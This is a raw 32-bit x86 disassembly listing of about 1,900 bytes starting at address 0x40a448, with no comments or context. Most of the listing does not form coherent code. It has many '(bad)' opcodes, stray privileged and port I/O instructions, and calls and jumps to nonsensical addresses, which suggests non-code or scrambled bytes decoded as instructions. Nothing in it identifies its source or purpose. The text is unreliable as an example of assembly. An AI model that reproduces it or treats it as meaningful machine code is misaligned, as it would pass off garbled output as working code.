  40a448:	xor    edx,DWORD PTR [edx+0x7201b8]
  40a44e:	add    BYTE PTR [edx],dl
  40a450:	enter  0x4d90,0x0
  40a454:	mov    eax,DWORD PTR [eax]
  40a456:	hlt    
  40a457:	add    al,0xa5
  40a459:	mov    al,0xff
  40a45b:	add    bh,bh
  40a45d:	add    BYTE PTR [ebx],dh
  40a45f:	inc    DWORD PTR [ebx]
  40a461:	sbb    al,0x89
  40a463:	jne    0x40a43d
  40a465:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40a46b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40a471:	mov    DWORD PTR [eax-0x70],0xee58e189
  40a478:	inc    DWORD PTR [ebp-0x75]
  40a47b:	ror    DWORD PTR [esp+ebp*8],1
  40a47e:	test   DWORD PTR [esi-0x1],esp
  40a481:	inc    ebp
  40a482:	(bad)  
  40a483:	aas    
  40a484:	inc    ebp
  40a485:	(bad)  
  40a486:	lea    edi,[esp+eiz*2-0x1]
  40a48a:	push   DWORD PTR [edi]
  40a48c:	mov    DWORD PTR [ecx],esi
  40a48e:	mov    al,ds:0x8b8000c7
  40a493:	out    dx,al
  40a494:	cld    
  40a495:	call   0xed3fea27
  40a49a:	(bad)  
  40a49b:	fisttp WORD PTR [eax+0x8801c7]
  40a4a1:	jmp    0x40a4e8
  40a4a3:	out    dx,al
  40a4a4:	inc    DWORD PTR [ebp-0x4]
  40a4a7:	xlat   BYTE PTR ds:[ebx]
  40a4a8:	lea    edi,[edi]
  40a4aa:	inc    edi
  40a4ac:	jmp    FWORD PTR [eax-0x78]
  40a4af:	inc    DWORD PTR [ecx]
  40a4b1:	aaa    
  40a4b2:	add    BYTE PTR [ecx],dh
  40a4b4:	pop    ecx
  40a4b5:	mov    DWORD PTR [eax],0xfff856c
  40a4bb:	ffreep st(5)
  40a4bd:	aas    
  40a4be:	add    bh,al
  40a4c0:	mov    esi,DWORD PTR [eax-0x4]
  40a4c3:	inc    DWORD PTR [eax+0xdf01ec]
  40a4c9:	(bad)  
  40a4ca:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40a4ce:	mov    esp,ebx
  40a4d0:	xchg   esp,eax
  40a4d1:	rol    DWORD PTR [eax],cl
  40a4d3:	(bad)  
  40a4d4:	mov    edi,DWORD PTR [eax+0x3]
  40a4d7:	(bad)  
  40a4d8:	cmp    al,0xd7
  40a4da:	dec    ebp
  40a4db:	lds    ecx,FWORD PTR [ebx+0x2ad8e8]
  40a4e1:	add    BYTE PTR [ebp-0x3b375],cl
  40a4e7:	adc    BYTE PTR [edx+0x1],0x55
  40a4eb:	add    BYTE PTR [ebx+0x6c8c30],cl
  40a4f1:	add    BYTE PTR [ebx-0x778afc7b],cl
  40a4f7:	mov    eax,DWORD PTR [eax]
  40a4f9:	cld    
  40a4fa:	push   0x7d
  40a4fc:	dec    DWORD PTR [ebx+0xd88c]
  40a502:	push   edx
  40a503:	mov    edx,DWORD PTR [ecx-0x4]
  40a506:	call   DWORD PTR [eax+0x7d01fc]
  40a50c:	mov    ecx,DWORD PTR [ebx+0x509000fc]
  40a512:	add    DWORD PTR [esi+0x0],edx
  40a515:	test   DWORD PTR [ebp+0x75],eax
  40a518:	call   0xc83d85a8
  40a51d:	jge    0x40a4b3
  40a51f:	mov    ebp,ebx
  40a521:	fcom   st(7)
  40a523:	add    bh,al
  40a525:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  40a52b:	add    edi,edi
  40a52d:	add    bh,bh
  40a52f:	imul   esp,ecx,0x4550d400
  40a535:	push   esi
  40a536:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40a53c:	test   BYTE PTR [ebx],dh
  40a53e:	aam    0x5
  40a540:	retf   0x4572
  40a543:	add    bl,ah
  40a545:	rcl    ebx,0x84
  40a548:	mov    DWORD PTR [ecx],0x46d1008c
  40a54e:	jl     0x40a550
  40a550:	test   edi,eax
  40a552:	jmp    esp
  40a554:	inc    DWORD PTR [eax]
  40a556:	loope  0x40a558
  40a558:	aam    0x75
  40a55a:	test   DWORD PTR [ebx+0x45fffcff],ecx
  40a560:	out    dx,al
  40a561:	mov    ebp,eax
  40a563:	mov    ah,0x85
  40a565:	add    bh,bh
  40a567:	call   0x114d06b
  40a56c:	retf   0x858b
  40a56f:	cld    
  40a570:	inc    DWORD PTR [eax+0xeb01ff]
  40a576:	out    dx,al
  40a577:	xor    BYTE PTR [ebp-0xff001e],al
  40a57d:	mov    edx,ecx
  40a57f:	cld    
  40a580:	jl     0x40a50b
  40a582:	mov    edx,0x50000001
  40a587:	add    DWORD PTR [ebp+0x45],eax
  40a58a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40a590:	dec    DWORD PTR [ebx-0x3fd80318]
  40a596:	add    BYTE PTR [ebp-0xbf0040],dl
  40a59c:	inc    ebp
  40a59d:	xor    DWORD PTR [ebx-0x4faf0400],ecx
  40a5a3:	inc    ebp
  40a5a4:	add    DWORD PTR [ebx+0x459c00],ecx
  40a5aa:	mov    edi,edi
  40a5ac:	mov    eax,0xe80800ff
  40a5b1:	inc    ebp
  40a5b2:	sub    cl,BYTE PTR [ebx-0x47000400]
  40a5b8:	add    al,0x1
  40a5ba:	rol    BYTE PTR [eax],0x1e
  40a5bd:	jne    0x40a604
  40a5bf:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40a5c5:	inc    DWORD PTR [ecx]
  40a5c7:	call   0x85cfcc
  40a5cc:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40a5d2:	call   0x40cfd8
  40a5d7:	xor    bh,bh
  40a5d9:	push   edi
  40a5da:	adc    BYTE PTR [ebx-0x747423bb],al
  40a5e0:	loopne 0x40a5be
  40a5e2:	ret    
  40a5e3:	loopne 0x40a583
  40a5e5:	xor    DWORD PTR [edx],0x31
  40a5e8:	cmp    edi,edi
  40a5ea:	bswap  esp
  40a5ec:	rol    BYTE PTR gs:[eax],0x5
  40a5f0:	jmp    0x12ba73a
  40a5f5:	mov    eax,DWORD PTR [ebp-0x4]
  40a5f8:	add    BYTE PTR [eax+0xff0100],bh
  40a5fe:	cld    
  40a5ff:	jne    0x40a67e
  40a601:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40a607:	mov    DWORD PTR [ecx],0x30500000
  40a60d:	inc    ebp
  40a60e:	add    BYTE PTR [ebx+0x459850],cl
  40a614:	mov    edi,edi
  40a616:	test   al,0xff
  40a618:	add    BYTE PTR [eax],cl
  40a61a:	inc    DWORD PTR [ebp-0x18]
  40a61d:	jmp    DWORD PTR [esi]
  40a61f:	fadd   QWORD PTR [eax]
  40a621:	jge    0x40a670
  40a623:	adc    BYTE PTR [ebx+0x459cb9],cl
  40a629:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40a62f:	sahf   
  40a630:	mov    eax,0x30132
  40a635:	lea    esi,[ebp+0x2c]
  40a638:	xor    edi,edi
  40a63a:	(bad)  
  40a63b:	call   0x13fcfa8
  40a640:	call   0x134d0d0
  40a645:	jne    0x40a5d2
  40a647:	xor    edi,esp
  40a649:	add    eax,DWORD PTR [eax+0xc018d]
  40a64f:	push   DWORD PTR [eax]
  40a651:	call   0xc9cfad
  40a656:	int3   
  40a657:	inc    DWORD PTR [ebp-0x14]
  40a65a:	mov    ecx,DWORD PTR [ebp-0x28]
  40a65d:	xor    eax,DWORD PTR [eax]
  40a65f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40a665:	(bad)  
  40a666:	xchg   ebp,eax
  40a667:	in     al,0xff
  40a669:	add    bh,bh
  40a66b:	add    BYTE PTR [esi],al
  40a66d:	inc    ebp
  40a66e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40a674:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  40a67b:	mov    edi,edi
  40a67d:	or     BYTE PTR [eax],cl
  40a67f:	inc    ebp
  40a680:	test   DWORD PTR gs:[eax],eax
  40a683:	je     0x40a6ca
  40a685:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40a68b:	xor    edx,DWORD PTR [eax-0x73]
  40a68e:	push   ebp
  40a68f:	or     BYTE PTR [ebp+0x21007572],al
  40a695:	inc    ebp
  40a696:	in     al,dx
  40a697:	mov    ebp,DWORD PTR [eax]
  40a699:	mov    esp,0x628bc345
  40a69e:	fmul   st,st(5)
  40a6a0:	add    BYTE PTR [ebx],ch
  40a6a2:	mov    eax,DWORD PTR [ebx]
  40a6a4:	cld    
  40a6a5:	loopne 0x40a667
  40a6a7:	inc    ebp
  40a6a8:	push   ebp
  40a6a9:	cmp    ebp,eax
  40a6ab:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  40a6b2:	cld    
  40a6b3:	fadd   DWORD PTR [eax+0x3b014d]
  40a6b9:	jne    0x40a6eb
  40a6bb:	push   0xf8898557
  40a6c0:	in     al,dx
  40a6c1:	jne    0x40a708
  40a6c3:	lea    eax,[ebx+0x72e8dcc8]
  40a6c9:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  40a6cf:	jmp    0x40a704
  40a6d1:	mov    edi,DWORD PTR [edi+0x4572bc]
  40a6d7:	xor    eax,edi
  40a6d9:	adc    DWORD PTR [ebp-0xcd0062],0x8b9231
  40a6e3:	rcl    BYTE PTR [eax-0x40],1
  40a6e6:	inc    ebp
  40a6e7:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40a6ef:	inc    ebp
  40a6f0:	xchg   ebp,eax
  40a6f1:	ud0    ebp,DWORD PTR [ebx]
  40a6f4:	inc    DWORD PTR [eax]
  40a6f6:	jl     0x40a76e
  40a6f8:	add    BYTE PTR [edx+0x1f558050],cl
  40a6fe:	mov    ecx,DWORD PTR [esp+esi*8]
  40a701:	inc    eax
  40a702:	retf   
  40a703:	inc    ebp
  40a704:	iret   
  40a705:	jb     0x40a6cf
  40a707:	mov    eax,DWORD PTR [edi]
  40a709:	enter  0x4545,0x1
  40a70d:	xor    eax,0x898b9c00
  40a712:	mov    esp,0x33344df0
  40a717:	pushf  
  40a718:	lea    ecx,[ecx+0x4d72e008]
  40a71e:	add    BYTE PTR [ebx],dh
  40a720:	inc    ebp
  40a721:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  40a727:	xor    dl,BYTE PTR [edx]
  40a729:	add    eax,DWORD PTR [ebp-0x77]
  40a72c:	mov    eax,esp
  40a72e:	fmul   DWORD PTR [ebp-0x3d]
  40a731:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  40a738:	mov    DWORD PTR [ebp-0x28],eax
  40a73b:	aad    0x45
  40a73d:	pushf  
  40a73e:	xor    eax,edi
  40a740:	mov    ecx,0xff858db0
  40a745:	clc    
  40a746:	enter  0x4d45,0x32
  40a74a:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40a751:	test   esi,edi
  40a753:	clc    
  40a754:	inc    DWORD PTR [ebp+0x45]
  40a757:	xor    BYTE PTR [ebx-0x3738f764],cl
  40a75d:	test   al,0x16
  40a75f:	test   DWORD PTR ds:0xff459cf8,esi
  40a765:	ds cld 
  40a767:	pushf  
  40a768:	inc    ebp
  40a769:	mov    edx,DWORD PTR [eax-0x28]
  40a76c:	outs   dx,DWORD PTR ds:[esi]
  40a76d:	push   ebp
  40a76e:	add    BYTE PTR [ebx],dh
  40a770:	mov    DWORD PTR [ebx],eax
  40a772:	sar    BYTE PTR [ebx],1
  40a774:	adc    BYTE PTR [edi],cl
  40a776:	dec    ebp
  40a777:	adc    al,0x8b
  40a779:	add    al,dl
  40a77b:	jmp    0x101a94b
  40a780:	jb     0x40a7cf
  40a782:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40a788:	xor    ecx,DWORD PTR [ebp+0x3b]
  40a78b:	xor    ecx,DWORD PTR [edi]
  40a78d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40a791:	(bad)  
  40a793:	clc    
  40a794:	enter  0x8400,0x8b
  40a798:	pop    es
  40a799:	mov    al,0x0
  40a79b:	push   ebp
  40a79c:	push   cs
  40a79d:	xor    ecx,eax
  40a79f:	xor    esp,ecx
  40a7a1:	add    ebp,DWORD PTR [eax]
  40a7a3:	add    esi,DWORD PTR [eax]
  40a7a5:	(bad)  
  40a7a7:	retf   0x55c8
  40a7aa:	repnz mov eax,DWORD PTR [ebp-0x10]
  40a7ae:	(bad)  
  40a7af:	cli    
  40a7b0:	fdivr  st,st(1)
  40a7b2:	test   DWORD PTR [eax+edi*8],ecx
  40a7b5:	dec    ebp
  40a7b6:	inc    ebp
  40a7b7:	xor    edi,DWORD PTR [eax-0x7167afd]
  40a7bd:	add    BYTE PTR [ebp+0x0],al
  40a7c0:	mov    ecx,DWORD PTR [ebp-0x28]
  40a7c3:	mov    ecx,ebx
  40a7c5:	clc    
  40a7c6:	jne    0x40a793
  40a7c8:	mov    esi,0xd672d3
  40a7cd:	into   
  40a7ce:	into   
  40a7cf:	scas   eax,DWORD PTR es:[edi]
  40a7d0:	dec    ebp
  40a7d1:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40a7d7:	sub    ecx,esi
  40a7d9:	cmp    ecx,DWORD PTR [ebp+0x77]
  40a7dc:	(bad)  
  40a7dd:	mov    edi,eax
  40a7df:	mov    al,0x85
  40a7e1:	mov    eax,edi
  40a7e3:	add    BYTE PTR [ebp-0x75],al
  40a7e6:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40a7ed:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40a7f3:	rdtsc  
  40a7f5:	retf   0x559c
  40a7f8:	(bad)  
  40a7f9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40a800:	inc    ebp
  40a801:	add    eax,0xeb9c4d3f
  40a806:	(bad)  
  40a807:	mov    ecx,esp
  40a809:	lods   al,BYTE PTR ds:[esi]
  40a80a:	test   DWORD PTR [ebp-0x8],edx
  40a80d:	xor    ecx,DWORD PTR [ebp+0x33]
  40a810:	mov    eax,DWORD PTR [ebx]
  40a812:	lock add ecx,ebx
  40a815:	bswap  esi
  40a817:	retf   0x55d1
  40a81a:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40a820:	jmp    0x40a81b
  40a822:	add    BYTE PTR ds:0xebc44d8b,al
  40a828:	push   ebp
  40a829:	mov    ebp,DWORD PTR [ebx]
  40a82b:	test   al,0x8b
  40a82d:	push   ebp
  40a82e:	clc    
  40a82f:	xor    ecx,ebx
  40a831:	xor    ecx,esi
  40a833:	add    edx,ecx
  40a835:	add    eax,DWORD PTR [edx+0xca010f]
  40a83b:	push   ebp
  40a83c:	dec    ebp
  40a83d:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40a843:	stc    
  40a844:	rol    DWORD PTR ds:0xebce4dd6,cl
  40a84a:	scas   eax,DWORD PTR es:[edi]
  40a84b:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40a851:	xor    ebp,DWORD PTR [ebx]
  40a853:	xor    edi,DWORD PTR [ebx]
  40a855:	add    esi,DWORD PTR [edi+0x3]
  40a858:	mov    ecx,DWORD PTR [edi]
  40a85a:	clc    
  40a85b:	retf   0x55cb
  40a85e:	into   
  40a85f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40a866:	mov    eax,0x3376554d
  40a86b:	mov    esi,DWORD PTR [ebx]
  40a86d:	int3   
  40a86e:	add    edx,DWORD PTR [ebp+0x3]
  40a871:	xor    ecx,DWORD PTR [edi]
  40a873:	xor    ecx,edx
  40a875:	add    edx,DWORD PTR [ebp+0x3]
  40a878:	mov    ecx,DWORD PTR [edi]
  40a87a:	lock retf 0x4dfa
  40a87e:	stc    
  40a87f:	mov    ecx,DWORD PTR [eax]
  40a881:	or     BYTE PTR [ebp+0x4d],cl
  40a884:	jmp    0x104a914
  40a889:	dec    ebp
  40a88a:	dec    ebp
  40a88b:	(bad)  
  40a88c:	mov    ebx,esp
  40a88e:	clc    
  40a88f:	test   ebx,ecx
  40a891:	clc    
  40a892:	ror    DWORD PTR [ebp-0x2a],cl
  40a895:	mov    esi,ecx
  40a897:	call   0x33cbee4b
  40a89c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40a8a3:	retf   
  40a8a4:	ja     0x40a874
  40a8a6:	mov    ebp,DWORD PTR [eax-0x48]
  40a8a9:	dec    ebp
  40a8aa:	xor    ecx,DWORD PTR [di+0x3]
  40a8ae:	mov    esp,esp
  40a8b0:	clc    
  40a8b1:	push   ebp
  40a8b2:	retf   
  40a8b3:	mov    dl,bl
  40a8b5:	adc    esi,edx
  40a8b7:	jb     0x40a887
  40a8b9:	add    BYTE PTR [edi-0x3b7474b3],ch
  40a8bf:	call   0x4d6c7441
  40a8c4:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40a8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8cb:	sahf   
  40a8cc:	inc    ebp
  40a8cd:	xor    cl,BYTE PTR [ebp-0x78]
  40a8d0:	mov    edx,edi
  40a8d2:	clc    
  40a8d3:	dec    ebp
  40a8d4:	retf   
  40a8d5:	mov    edx,ebx
  40a8d7:	call   0x560f7cb2
  40a8dc:	scas   eax,DWORD PTR es:[edi]
  40a8dd:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40a8e3:	sahf   
  40a8e4:	sub    esi,DWORD PTR [edx]
  40a8e6:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40a8ec:	lods   al,BYTE PTR ds:[esi]
  40a8ed:	xor    esp,DWORD PTR [ebx]
  40a8ef:	add    ecx,DWORD PTR [ebp-0x1c]
  40a8f2:	mov    edi,DWORD PTR [ebp-0x8]
  40a8f5:	mov    bl,cl
  40a8f7:	cmp    dl,bl
  40a8f9:	jb     0x40a8c9
  40a8fb:	add    dh,dl
  40a8fd:	dec    ebp
  40a8fe:	scas   eax,DWORD PTR es:[edi]
  40a8ff:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40a905:	shr    DWORD PTR [ebx],cl
  40a907:	into   
  40a908:	cmp    edx,esi
  40a90a:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40a910:	dec    ebp
  40a911:	dec    ebp
  40a912:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40a918:	retf   
  40a919:	xor    edx,esi
  40a91b:	add    ecx,esi
  40a91d:	imul   ecx,edx
  40a920:	mov    DWORD PTR [ebp+0x8],edx
  40a923:	xor    ecx,DWORD PTR [ebp+0x2b]
  40a926:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40a92c:	add    esi,DWORD PTR [ebx]
  40a92e:	mov    ah,0x3
  40a930:	inc    ebp
  40a931:	sysexit 
  40a933:	xlat   BYTE PTR ds:[ebx]
  40a934:	pushf  
  40a935:	jge    0x40a8c0
  40a937:	xor    ebx,eax
  40a939:	sub    eax,DWORD PTR [ebp-0x73]
  40a93c:	(bad)  
  40a93d:	cmp    al,al
  40a93f:	jb     0x40a8c6
  40a941:	add    al,bh
  40a943:	ror    DWORD PTR [ebp-0x7a],1
  40a946:	xor    edi,edi
  40a948:	add    edi,edi
  40a94a:	jmp    0x40a999
  40a94c:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40a952:	dec    ebp
  40a953:	into   
  40a954:	mov    ebp,DWORD PTR [edi-0x23737428]
  40a95a:	sahf   
  40a95b:	shl    DWORD PTR [edx],cl
  40a95d:	retf   0x5588
  40a960:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40a966:	add    eax,DWORD PTR [eax]
  40a968:	in     al,0x4d
  40a96a:	push   ebp
  40a96b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40a971:	bound  eax,QWORD PTR [eax]
  40a973:	int    0x4d
  40a975:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40a97b:	dec    ebp
  40a97c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40a982:	jge    0x40a952
  40a984:	mov    BYTE PTR [edi+0xf723b3a],ch
  40a98a:	add    cl,dh
  40a98c:	dec    ebp
  40a98d:	dec    DWORD PTR [ebx-0x2c032375]
  40a993:	adc    BYTE PTR [ebp+0x1],0x8b
  40a997:	add    al,bl
  40a999:	jge    0x40a927
  40a99b:	push   0xffffff9e
  40a99d:	push   0x8b3032
  40a9a2:	shl    BYTE PTR [ebp+0x55],0x6a
  40a9a6:	xor    edi,edi
  40a9a8:	xor    edx,DWORD PTR [ebx+eax*1]
  40a9ab:	inc    ebp
  40a9ac:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40a9b2:	dec    ebp
  40a9b3:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40a9b9:	jbe    0x40a946
  40a9bb:	mov    ebp,esp
  40a9bd:	ror    bl,1
  40a9bf:	enter  0x14ce,0xaf
  40a9c3:	dec    DWORD PTR [ebx-0x2cef17f8]
  40a9c9:	push   ebp
  40a9ca:	retf   0x5540
  40a9cd:	push   ebp
  40a9ce:	mov    esi,DWORD PTR [edx-0x1c]
  40a9d1:	mov    edx,ebx
  40a9d3:	cld    
  40a9d4:	(bad)  
  40a9d5:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40a9dc:	sti    
  40a9dd:	add    dh,cl
  40a9df:	push   0xffffff94
  40a9e1:	call   FWORD PTR [esi+0x3b5032d0]
  40a9e7:	mov    ecx,DWORD PTR [edi]
  40a9e9:	int3   
  40a9ea:	pop    esi
  40a9eb:	inc    ebp
  40a9ec:	dec    DWORD PTR [ecx+0x45e8c88b]
  40a9f2:	push   ebp
  40a9f3:	xor    esi,DWORD PTR [ebx]
  40a9f5:	mov    DWORD PTR [ebx],0xcacc0f9c
  40a9fb:	aas    
  40a9fc:	push   ebp
  40a9fd:	inc    ebp
  40a9fe:	xor    eax,esp
  40aa00:	add    eax,esp
  40aa02:	mov    eax,DWORD PTR [ebx]
  40aa04:	(bad)  
  40aa05:	jmp    0x40a993
  40aa07:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  40aa0d:	rol    ah,1
  40aa0f:	mov    esi,0xf133104d
  40aa14:	mov    edx,0xff358d80
  40aa19:	mov    dh,0xd1
  40aa1b:	cmp    edx,DWORD PTR [ebp+0xf]
  40aa1e:	mov    eax,DWORD PTR [edx-0x20]
  40aa21:	add    BYTE PTR [ebp-0x75],bh
  40aa24:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40aa2b:	sahf   
  40aa2c:	retf   0x8632
  40aa2f:	cmp    ebp,0x8
  40aa32:	call   ebx
  40aa34:	inc    ebp
  40aa35:	inc    ebp
  40aa36:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40aa3c:	mov    esi,DWORD PTR ds:0xc7049cc8
  40aa42:	add    al,al
  40aa44:	add    bl,al
  40aa46:	(bad)  
  40aa47:	clc    
  40aa48:	enter  0x45,0x35
  40aa4c:	push   eax
  40aa4d:	pushf  
  40aa4e:	mov    edi,eax
  40aa50:	int3   
  40aa51:	or     al,al
  40aa53:	test   DWORD PTR [edi],edi
  40aa55:	clc    
  40aa56:	gs inc ebp
  40aa58:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40aa5e:	push   ss
  40aa5f:	xor    ecx,DWORD PTR [ebp+0x3]
  40aa62:	sub    edx,DWORD PTR [ecx-0x76]
  40aa65:	dec    ebp
  40aa66:	add    DWORD PTR [ebx+0x88d845],ecx
  40aa6c:	mov    esi,DWORD PTR [ebx]
  40aa6e:	or     BYTE PTR [ebx],al
  40aa70:	cmp    edx,DWORD PTR [ecx-0x38]
  40aa73:	dec    ebp
  40aa74:	out    dx,eax
  40aa75:	xor    eax,DWORD PTR [ebp+0x3]
  40aa78:	mov    edx,DWORD PTR [ecx-0x28]
  40aa7b:	dec    ebp
  40aa7c:	add    BYTE PTR [ebx],dh
  40aa7e:	push   0x518003
  40aa83:	push   eax
  40aa84:	add    BYTE PTR [ebx-0x300748b],cl
  40aa8a:	sbb    BYTE PTR [ebp+0x45],cl
  40aa8d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40aa93:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40aa99:	dec    ebp
  40aa9a:	inc    ebp
  40aa9b:	xor    eax,esp
  40aa9d:	add    eax,esp
  40aa9f:	push   ecx
  40aaa0:	(bad)  
  40aaa1:	dec    ebp
  40aaa2:	mov    al,ds:0xc9e031ff
  40aaa7:	retf   
  40aaa8:	(bad)  
  40aaa9:	into   
  40aaaa:	sub    bh,bh
  40aaac:	dec    esp
  40aaad:	adc    al,0x9c
  40aaaf:	inc    ebp
  40aab0:	push   ebp
  40aab1:	test   DWORD PTR [edi],ecx
  40aab3:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  40aaba:	jmp    0xc9b9b9ce
  40aabf:	add    cl,dl
  40aac1:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40aacb:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40aad1:	rol    BYTE PTR [eax],0x57
  40aad4:	clc    
  40aad5:	bound  esi,QWORD PTR [edx+0x7]
  40aad8:	mov    eax,DWORD PTR [ebp-0x30]
  40aadb:	xor    al,0x40
  40aadd:	sub    al,0xc7
  40aadf:	mov    ah,ch
  40aae1:	add    DWORD PTR [ebp+0x4534f845],eax
  40aae7:	sub    al,0x86
  40aae9:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40aaf0:	mov    ch,0xff
  40aaf2:	clc    
  40aaf3:	add    DWORD PTR [ebp+0x60],0x31
  40aaf7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40aafe:	inc    ebp
  40aaff:	dec    DWORD PTR [ebx-0x341ff701]
  40ab05:	test   esi,ecx
  40ab07:	dec    DWORD PTR [ebx-0x7f8a3301]
  40ab0d:	push   eax
  40ab0e:	add    DWORD PTR [ebp+0x0],eax
  40ab11:	dec    ebx
  40ab13:	or     al,0xce
  40ab15:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40ab1c:	into   
  40ab1d:	add    BYTE PTR [ebx-0x34ff1400],cl
  40ab23:	mov    esi,ecx
  40ab25:	sar    bh,0x45
  40ab28:	adc    al,0x8b
  40ab2a:	clc    
  40ab2b:	fadd   DWORD PTR [ebp+0x0]
  40ab2e:	mov    ebp,DWORD PTR [edx+0x8]
  40ab31:	push   edi
  40ab32:	adc    BYTE PTR [eax+0x1],0x83
  40ab36:	add    al,al
  40ab38:	retf   
  40ab39:	mov    ecx,esi
  40ab3b:	cld    
  40ab3c:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40ab42:	into   
  40ab43:	add    BYTE PTR [ebx+0x756aec00],cl
  40ab49:	jne    0x40ab7e
  40ab4b:	inc    DWORD PTR [ebx]
  40ab4d:	rcl    BYTE PTR [ecx+0x50],1
  40ab50:	push   eax
  40ab51:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40ab57:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40ab5e:	sar    bh,0x84
  40ab61:	or     BYTE PTR [ebx],al
  40ab63:	push   eax
  40ab64:	add    BYTE PTR [ebx+0x4532c845],cl
  40ab6a:	pushf  
  40ab6b:	xor    eax,0x89b49cc7
  40ab70:	test   eax,ebp
  40ab72:	clc    
  40ab73:	inc    ebp
  40ab74:	inc    ebp
  40ab75:	mov    DWORD PTR [eax+eax*8],esi
  40ab78:	sub    al,0x34
  40ab7a:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  40ab81:	dec    ebp
  40ab82:	bound  esi,QWORD PTR [ebx]
  40ab84:	inc    edi
  40ab85:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  40ab8b:	dec    ebp
  40ab8c:	bound  esi,QWORD PTR [ebx]
  40ab8e:	inc    edi
  40ab8f:	add    eax,DWORD PTR [ebx-0xf7a377]
  40ab95:	inc    ebp
  40ab96:	add    ch,dl
  40ab98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab99:	pushf  
  40ab9a:	inc    edi
  40ab9c:	dec    esp
  40ab9e:	lea    eax,[ebp+0x45fff860]
  40aba4:	push   eax
  40aba5:	xor    dh,BYTE PTR [ebp-0x64]
  40aba8:	(bad)  
  40aba9:	(bad)  
  40abaa:	pop    esp
  40abab:	lods   al,BYTE PTR ds:[esi]
  40abac:	inc    DWORD PTR [ebp+0x4508f8ff]
  40abb2:	mov    esi,DWORD PTR [eax]
  40abb4:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40abbb:	test   DWORD PTR [edi-0x8],edx
  40abbe:	inc    esi
  40abbf:	inc    ebp
  40abc0:	add    BYTE PTR [esi],bh
  40abc2:	push   0x8b809c
  40abc7:	in     al,dx
  40abc8:	inc    ebp
  40abc9:	push   ebp
  40abca:	mov    esi,DWORD PTR [ebx]
  40abcc:	cld    
  40abcd:	add    eax,DWORD PTR [eax+0xf013b]
  40abd3:	adc    al,0x0
  40abd5:	add    bh,bh
  40abd7:	jmp    0xbdacf4
  40abdc:	add    BYTE PTR [ebp+0x45],cl
  40abdf:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40abe5:	dec    ebp
  40abe6:	push   0x38033
  40abeb:	cmp    eax,DWORD PTR [eax]
  40abed:	unpcklps xmm7,xmm0
  40abf0:	jne    0x40abf2
  40abf2:	dec    DWORD PTR [ebx+0x5545cc18]
  40abf8:	mov    DWORD PTR [ebx],esi
  40abfa:	shl    BYTE PTR [ebx],1
  40abfc:	inc    ebp
  40abfd:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40ac03:	retf   0x5575
  40ac06:	dec    DWORD PTR [ebx-0x5ba17e8]
  40ac0c:	(bad)  
  40ac0d:	stc    
  40ac0e:	in     al,dx
  40ac0f:	or     al,0x85
  40ac11:	dec    ebp
